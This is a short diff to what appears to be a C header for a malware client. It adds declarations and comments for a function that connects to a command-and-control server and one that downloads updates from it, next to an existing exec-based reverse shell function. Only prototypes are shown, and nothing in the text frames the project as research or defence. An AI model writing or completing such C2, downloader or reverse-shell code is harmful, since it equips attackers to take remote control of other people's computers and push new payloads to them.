@@ -6,6 +6,32 @@
 #define EXIT_COMMAND "exit\n"
 
 /** 
+ * Create the socket to connect to the CC server
+ * 
+ * It connects to the command and control server.
+ * 
+ * ip_addr - String with ip address of the listener
+ * port - int where the port goes.
+ * socket_desc - ???
+ * server - to save the socket struct
+ * 
+ * Returns - OK or ERROR
+*/
+int connect_cc(char *ip_adrr, int port, int *socket_desc, struct sockaddr_in *server);
+
+/** 
+ * Update downloader
+ * 
+ * It downloads updates from CC server
+ * 
+ * ip_addr - String with ip address of the listener
+ * port - int where the port goes.
+ * 
+ * Returns - OK or ERROR
+*/
+int download_update(char *ip_addr, int port);
+
+/** 
  * Reverse shell using exec
  * 
  * It has the same limitations as exec. You can end the reverse shell by typing exit.
